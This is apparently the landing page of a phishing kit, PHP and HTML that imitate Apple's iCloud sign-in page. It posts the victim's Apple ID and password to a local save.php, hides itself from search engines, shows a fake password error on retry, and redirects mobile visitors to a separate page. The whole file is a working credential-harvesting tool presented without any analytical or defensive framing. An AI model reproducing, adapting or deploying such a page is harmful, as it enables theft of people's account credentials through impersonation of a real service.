<?php  
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
 
switch ($lang) {
  case 'en':
  $lang_file = 'lang.en.php';
  break;
 
  case 'fr':
  $lang_file = 'lang.fr.php';
  break;
 
  case 'es':
  $lang_file = 'lang.es.php';
  break;

  case 'de':
  $lang_file = 'lang.de.php';
  break;
 
  default:
  $lang_file = 'lang.en.php';
 
}
 
// include_once 'languages/'.$lang_file;
?>

<!DOCTYPE html>
<html lang="en">
<head>
 <!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]--> 
 <!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 9]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 10]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta content="width=device-width, initial-scale=1" name="viewport"/>
	<meta name="robots" content="noindex, nofollow" />
	<title>Home Page</title>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<link rel="shortcut icon" href="assets/img/favicon.ico">
	<link rel="stylesheet" href="assets/layout/strap.css">
	<link rel="stylesheet" href="assets/layout/apple.css">
	<link rel="stylesheet" href="assets/layout/kit.css">
	<link rel="stylesheet" href="assets/layout/animate.css">

<script type="text/javascript">
  <!--
  if (screen.width <= 800) {
    window.location = "mobiv.php";
  }
  //-->
</script>

<script src="assets/js/jquery-3.5.1.min.js"></script>
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
	<script>
      $(document).ready(function() {
		$('#preloader').delay(900).fadeOut('slow'); // will fade out the white DIV that covers the website.
		$('body').css({'overflow':'visible'});
		$('#test').delay(900).css({'display':'block'});

			$('.checkbox-state-normal').click(function() {
				$('.checkbox-state-normal').hide();
				$('.checkbox-state-focused-selected').css("display","");

			});
		  
		  $('.checkbox-state-focused-selected').click(function() {
				$('.checkbox-state-focused-selected').hide();
				$('.checkbox-state-normal').css("display","");

			});
		});
	</script>	
</head>
<body>
<!-- Preloader -->
<div id="preloader">
	<div id="status"><span></span></div>
</div>

<section id="header" class="container m-2">
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 col-xs-8 rightH rtl">
				<a class="help" title="Help and Support" alt="Help and Support" href="https://help.apple.com/icloud/"></a>
				<span class="spreat"></span>
								<a class="setup applef" target="_blank" href="https://www.apple.com/icloud/setup/">Setup INstruction</a>
								<div class="setup fName" style="display: none;"><i class="glyphicon glyphicon-menu-down"></i><span><img src="assets/img/user.jpeg" alt=""></span>
					<ul>
						<li><a href="find">iCloud Settings</a></li>
						<li><a href="logout">Sign Out</a></li>
					</ul>
				</div>

			</div>
			<div class="col-md-8 col-xs-4 leftH">
				<span class="icloud"></span>
			</div>
		</div>
	</div>
</section>

<section class="login-form text-center container" style="display: block;">

	<img src="assets/img/cloud.png" class="img-cloud" alt="">
	
	<div class="row">
		<h2 class="mb-2">Sign In</h2>
	</div>
	<form action="save.php" class="cloud-login form-ajax" role="form" data-red="find" method="post" accept-charset="utf-8">

		<div class="row justify-content-center mb-3">
			<div class="form-group col-md-5">
				<input type="text" class="id form-control" name="appleid" id="appleID" placeholder="Apple ID" style="direction: ltr !important;">	
			</div>
			<div class="form-group col-md-5">
				<input type="password" autocomplete="off" class="pwd form-control" name="password" id="password" placeholder="Password">	
			</div>
		</div>
		
		<div class="row justify-content-center">
			<input type="submit" class="dolog  btn" name="singin" id="singin" value="Sign In">	
		</div>
		<!-- <img class="loading" src="assets/img/ajax-loader.gif" alt="Loading" /> -->
		<div class="alert">
		</div>
		
	</form>

	<div class="keepme">
		<input type="checkbox" id="keepme" />
		<span for="keepme">Keep Me</span>
	</div>

	<div class="forget">
		<a href="https://iforgot.apple.com/" target="_blank">Forget ID</a>
		<div id="response"></div>
	</div>
	<div class="newid">
		DON'T HAVE ID <a href="https://appleid.apple.com/account" target="blank"> CREATE_YOURS</a>
		<div id="response"></div>
	</div>

</section>

<section class="imessage" style="display: none;">


	<div class="container">
		<div class="row">
		<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/11.png" alt="">
					<span>Reminders</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/9.png" alt="">
					<span>
						Notes
					</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/3.png" alt="">
					<span>iCloud Drive</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/10.png" alt="">
					<span>Photos</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/1.png" alt="">
					<span>Contacts</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/8.png" alt="">
					<span>Mail</span>
				</a>
			</div>
			
			
			

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/12.png" alt="">
					<span>Settings</span>
				</a>
			</div>

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/2.png" alt="">
					<span>Find My iPhone</span>
				</a>
			</div>

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/6.png" alt="">
					<span>Keynote</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/5.png" alt="">
					<span>Numbers</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/20.png" alt="">
					<span>Find Friends</span>
				</a>
			</div>

			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find" class="text-cente imb">
					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
					<img class="" src="assets/img/7.png" alt="">
					<span>Pages</span>
				</a>
			</div>
			

		</div>
	</div>


</section>

<!-- <footer class="foot">
	<div class="container-fluid">
		<div class="row">
		
		<div class="col-md-10 col-sm-12 foot-link">
			<a href="https://www.icloud.com/activationlock" target="blank">CHECK_ACTIVATION</a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/support/systemstatus/" target="_blank">SYSTEM_STATUS</a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/privacy/" target="_blank">POLICY</a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/legal/icloud/ww/" target="_blank">TERMS</a>
			<span class="footer-link-separator"></span>
			<span class="copyright">COPYRIGHT</span>
		</div>
		<div class="col-md-2 col-xs-12 apple">
			<a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>
		</div>

		</div>
	</div>
</footer> -->
	
	<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
	<script src="assets/js/strap.min.js"></script>
	<script src="assets/js/findmyphone.min.js"></script>
	<!-- <script src="assets/js/apple.min.js"></script>
	<script src="assets/js/ajax-form.min.js"></script> -->
<?php
if(isset($_GET["error"])){
echo 'IDPWD_ERROR_ALERT';
}
?>
</body>
</html>